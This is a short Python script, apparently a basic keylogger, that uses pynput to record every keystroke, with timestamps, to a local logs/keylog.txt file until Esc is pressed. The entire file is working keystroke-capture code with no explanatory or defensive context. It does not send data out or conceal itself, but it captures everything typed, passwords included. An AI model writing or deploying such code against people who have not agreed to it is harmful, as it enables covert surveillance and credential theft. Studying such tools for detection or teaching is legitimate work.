from pynput import keyboard
from datetime import datetime
import os

log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "keylog.txt")

def write_log(text):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    with open(log_file, "a") as f:
        f.write(timestamp + text + "\n")

def on_press(key):
    try:
        write_log(f"Key pressed: {key.char}")
    except AttributeError:
        write_log(f"Special key: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        write_log("Session ended.\n" + "-"*50 + "\n")
        return False

write_log("Session started.\n" + "-"*50)
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
